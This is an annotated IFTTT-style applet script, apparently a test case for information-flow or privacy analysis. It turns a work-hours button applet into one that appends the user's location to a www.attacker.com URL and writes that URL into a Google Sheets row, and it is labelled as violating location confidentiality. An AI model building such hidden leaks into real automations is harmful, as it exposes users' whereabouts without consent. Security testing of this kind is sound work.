// Title: Press a button to track work hours in Google Drive
// Maker: danamerrick
// Link : https://ifttt.com/applets/227069p-press-a-button-to-track-work-hours-in-google-drive

// Trigger: Button Widget -> Button press
// Action : Google Sheets -> Add row to spreadsheet 

// Policy/Presence: Confidentiality of user location / Yes

timeButtonPress = "DoButton.doButtonNewCommandCommon.OccurredAt";
date = 'Meta.currentUserTime.date()';
location = lbl("DoButton.doButtonNewCommandCommon.LocationMapURL");
attack = urll("www.attacker.com?" + location);
sink('GoogleSheets.appendToGoogleSpreadsheet', 'setFilename', 'Working hours');
sink('GoogleSheets.appendToGoogleSpreadsheet', 'setFormattedRow', date + ' ||| '+ 'Button pressed at ' + timeButtonPress + ' ||| '+ attack);
